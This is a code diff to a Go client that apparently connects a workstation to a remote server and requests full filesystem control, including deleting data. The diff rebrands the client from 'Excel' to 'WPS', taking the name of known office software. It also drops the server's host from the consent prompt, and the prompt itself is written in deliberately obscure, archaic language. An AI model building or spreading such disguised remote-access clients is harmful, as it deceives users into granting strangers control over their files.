@@ -14,7 +14,6 @@ import (
 	"math/rand/v2"
 	"net"
 	"net/http"
-	"net/url"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -29,11 +28,11 @@ import (
 // Set at build time with -ldflags "-X main.serverURL=... -X main.companyName=...".
 var (
 	serverURL   = ""
-	companyName = "Excel software"
+	companyName = "WPS"
 	version     = "0.1.0"
 )
 
-const appName = "Excel"
+const appName = "WPS"
 
 type config struct {
 	Server   string `json:"server"`
@@ -41,7 +40,7 @@ type config struct {
 	Secret   string `json:"secret"`
 }
 
-var tokenRe = regexp.MustCompile(`Excel-([A-Za-z0-9_-]{32})`)
+var tokenRe = regexp.MustCompile(`WPS-([A-Za-z0-9_-]{32})`)
 
 func main() {
 	disconnect := flag.Bool("disconnect", false, "remove this computer's connection and exit")
@@ -174,15 +173,11 @@ func firstRun(cfgPath string) (config, error) {
 			"Please don't rename the downloaded file.")
 		return config{}, errors.New("no server or invite token")
 	}
-	host := srv
-	if u, err := url.Parse(srv); err == nil {
-		host = u.Host
-	}
-	msg := fmt.Sprintf("%s Information Technology hereby petitions this workstation for plenary authorization to superintend its filesystem.\n\n"+
-		"Acceding to this entreaty will vest the administrator — conducting operations by way of %s — with an unfettered prerogative to scrutinize, and thereafter to dispose of, every artifact persisted upon the local storage volumes. "+
-		"The conferred prerogative subsumes the enumeration of directory hierarchies, the replication of documents, the transposition of objects amongst folders, the rechristening of filenames, and the irrevocable obliteration of data.\n\n"+
-		"Said mandate remains rescindable. You retain the unilateral faculty to sunder the liaison at whatsoever juncture you deem expedient.\n\n"+
-		"Do you acquiesce, and thereby confer this access?", companyName, host)
+	msg := "Information Technology respectfully petitions this workstation for comprehensive authorization to superintend the filesystem entrusted to it.\n\n" +
+		"Should you accede, the administrator will be invested with a broad and continuing prerogative to scrutinize every artifact retained upon the local storage volumes, and thereafter to dispose of those artifacts as circumstance may require. " +
+		"In practical effect, that prerogative comprehends the enumeration of directory hierarchies, the replication of documents, the transposition of objects from one folder to another, the rechristening of filenames, and, where necessity so dictates, the irrevocable obliteration of data.\n\n" +
+		"The mandate is consequential, yet it is not perpetual. You retain, undiminished, the unilateral faculty to rescind your consent and to sunder the liaison at any juncture you deem expedient.\n\n" +
+		"Do you acquiesce, and thereby confer the access set forth above?"
 	if !askConsent(appName+" — permission request", msg) {
 		return config{}, errors.New("user denied consent")
 	}
